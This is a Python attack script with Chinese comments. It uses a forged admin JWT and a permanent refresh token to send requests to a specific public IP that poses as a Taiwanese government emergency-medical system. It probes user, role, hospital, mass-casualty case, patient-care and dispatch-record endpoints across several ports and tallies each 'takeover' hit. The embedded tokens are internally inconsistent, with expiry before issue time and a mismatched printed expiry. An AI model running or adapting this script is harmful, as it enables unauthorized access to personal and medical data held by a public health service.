#!/usr/bin/env python3
"""
admin2 JWT 接管验证脚本
- 携带 admin2 JWT 投递 3400/3800/3001/8000 等端口业务 API
- 验证横移接管面，记录 HTTP 状态/字节数/响应头指纹
"""
import json
import subprocess
import sys
import time

# admin2 伪造 JWT (48h exp)
ADMIN2_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50IjoiYWRtaW4yIiwicm9sZSI6IkFETUlOIiwidXNlciI6eyJpZCI6MzcsIm5hbWUiOiJhZG1pbjIiLCJhY2NvdW50IjoiYWRtaW4yIn0sInBlcm1pc3Npb25zIjpbXSwiaWF0IjoxNzg4MDU2NDg3LCJleHAiOjE3ODIyOTI4ODd9.KNahoIKJcsekOjVta6-yoLTgp3P2SsHTgsnKSJQT3wo"

# admin2 refreshToken (无 exp，可永久续期)
ADMIN2_REFRESH = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MzcsImlhdCI6MTc4ODA1NjQ4N30.KNahoIKJcsekOjVta6-yoLTgp3P2SsHTgsnKSJQT3wo"

# 攻击矩阵: (host, port, path, method, body)
MATRIX = [
    # 3400 authServer - 全栈业务端点
    ("35.234.50.28", 3400, "/users", "GET", None),
    ("35.234.50.28", 3400, "/Permissions", "GET", None),
    ("35.234.50.28", 3400, "/Roles", "GET", None),
    ("35.234.50.28", 3400, "/Branches", "GET", None),
    ("35.234.50.28", 3400, "/users/1", "GET", None),
    ("35.234.50.28", 3400, "/users/2", "GET", None),
    ("35.234.50.28", 3400, "/users/37", "GET", None),
    ("35.234.50.28", 3400, "/health", "GET", None),
    ("35.234.50.28", 3400, "/refreshToken", "POST", {"refreshToken": ADMIN2_REFRESH}),
    ("35.234.50.28", 3400, "/api/users", "GET", None),
    ("35.234.50.28", 3400, "/api/permissions", "GET", None),
    # 3800 mciServer - 业务 API
    ("35.234.50.28", 3800, "/Hospitals", "GET", None),
    ("35.234.50.28", 3800, "/MciTypes", "GET", None),
    ("35.234.50.28", 3800, "/MciCaseRecords", "GET", None),
    ("35.234.50.28", 3800, "/MciPcrs", "GET", None),
    ("35.234.50.28", 3800, "/Branches", "GET", None),
    # 3001 statUrl - 业务 API
    ("35.234.50.28", 3001, "/Branches", "GET", None),
    ("35.234.50.28", 3001, "/Hospitals", "GET", None),
    ("35.234.50.28", 3001, "/MciTypes", "GET", None),
    # 8000 EPCRServer
    ("35.234.50.28", 8000, "/DispatchRecords", "GET", None),
    ("35.234.50.28", 8000, "/health", "GET", None),
    ("35.234.50.28", 8000, "/config", "GET", None),
]

def curl_call(host, port, path, method, body=None):
    cmd = [
        "curl", "-sS", "-k", "-o", "-", "-w", "\n[STATUS=%{http_code} SIZE=%{size_download} TIME=%{time_total} ETAG=%header{etag} CT=%header{content-type}]\n",
        "-X", method,
        "-H", f"Authorization: Bearer {ADMIN2_JWT}",
        "-H", "Origin: https://emic2.emic.gov.tw",
        "-H", "User-Agent: Mozilla/5.0 (Pentest)",
    ]
    if body is not None:
        cmd += ["-H", "Content-Type: application/json", "-d", json.dumps(body)]
    cmd.append(f"http://{host}:{port}{path}")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=12)
        out = r.stdout
        # extract last line
        lines = out.rstrip().split("\n")
        meta = lines[-1] if lines and lines[-1].startswith("[STATUS=") else ""
        body_str = "\n".join(lines[:-1]) if meta else out
        return meta, body_str[:400]
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]", ""
    except Exception as e:
        return f"[ERR {e}]", ""

def main():
    results = []
    print(f"[*] admin2 JWT 接管验证 - {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] JWT payload: id=37 account=admin2 role=ADMIN use2FA=false exp=1788292887")
    print(f"="*120)
    for host, port, path, method, body in MATRIX:
        meta, body_preview = curl_call(host, port, path, method, body)
        status_ok = "200" in meta or "201" in meta
        marker = "[接管]" if status_ok else "[拒绝]"
        print(f"{marker} {method:5s} http://{host}:{port}{path:30s} {meta}")
        if status_ok and body_preview:
            print(f"        预览: {body_preview[:200]}")
        results.append((host, port, path, method, meta, status_ok))
    # 统计
    ok_count = sum(1 for r in results if r[5])
    print("="*120)
    print(f"[*] 接管命中: {ok_count}/{len(results)} ({ok_count*100//len(results)}%)")
    print(f"[*] 命中清单:")
    for host, port, path, method, meta, ok in results:
        if ok:
            print(f"    {host}:{port}{path} {method}")

if __name__ == "__main__":
    main()
